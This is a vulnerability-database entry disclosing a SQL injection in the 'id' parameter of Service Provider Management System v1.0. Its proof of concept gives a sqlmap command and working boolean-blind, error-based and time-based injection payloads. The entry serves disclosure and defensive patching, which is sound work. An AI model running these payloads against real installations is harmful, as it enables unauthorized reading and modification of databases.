---
title: Service Provider Management System v1.0 SQL Injection
url: https://cxsecurity.com/issue/WLB-2023050055
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-05-25
fetch_date: 2025-10-04T11:36:55.106018
---

# Service Provider Management System v1.0 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Service Provider Management System v1.0 SQL Injection** **2023.05.24**  Credit:  **[Ashik Kunjumon](https://cxsecurity.com/author/Ashik%2BKunjumon/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

# Exploit Title: Service Provider Management System v1.0 - SQL Injection
# Date: 2023-05-23
# Exploit Author: Ashik Kunjumon
# Vendor Homepage: https://www.sourcecodester.com/users/lewa
# Software Link: https://www.sourcecodester.com/php/16501/service-provider-management-system-using-php-and-mysql-source-code-free-download.html
# Version: 1.0
# Tested on: Windows/Linux
1. Description:
Service Provider Management System v1.0 allows SQL Injection via ID
parameter in /php-spms/?page=services/view&id=2
Exploiting this issue could allow an attacker to compromise the
application, access or modify data,
or exploit the latest vulnerabilities in the underlying database.
Endpoint: /php-spms/?page=services/view&id=2
Vulnerable parameter: id (GET)
2. Proof of Concept:
----------------------
Step 1 - By visiting the url:
http://localhost/php-spms/?page=services/view&id=2 just add single quote to
verify the SQL Injection.
Step 2 - Run sqlmap -u " http://localhost/php-spms/?page=services/view&id=2"
-p id --dbms=mysql
SQLMap Response:
----------------------
Parameter: id (GET)
Type: boolean-based blind
Title: AND boolean-based blind - WHERE or HAVING clause
Payload: page=services/view&id=1' AND 8462=8462 AND 'jgHw'='jgHw
Type: error-based
Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP
BY clause (FLOOR)
Payload: page=services/view&id=1' AND (SELECT 1839 FROM(SELECT
COUNT(\*),CONCAT(0x7178717171,(SELECT
(ELT(1839=1839,1))),0x7176786271,FLOOR(RAND(0)\*2))x FROM
INFORMATION\_SCHEMA.PLUGINS GROUP BY x)a) AND 'Cqhk'='Cqhk
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: page=services/view&id=1' AND (SELECT 1072 FROM
(SELECT(SLEEP(5)))lurz) AND 'RQzT'='RQzT

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023050055)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top